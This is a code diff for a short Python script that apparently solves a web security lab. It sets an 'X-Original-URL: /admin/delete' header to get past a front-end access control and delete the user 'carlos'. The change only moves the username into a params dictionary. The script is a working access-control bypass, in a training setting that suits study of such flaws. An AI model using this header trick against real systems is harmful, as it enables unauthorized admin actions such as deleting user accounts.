@@ -7,7 +7,8 @@ def main() -> None:
     """Entry point"""
     site = Lab()
     site.session.headers.update({"X-Original-URL": "/admin/delete"})
-    site.session.get(url=site.url + "/?username=carlos")
+    payload = {"username": "carlos"}
+    site.session.get(url=site.url + "/", params=payload)
 
 if __name__ == "__main__":
     main()
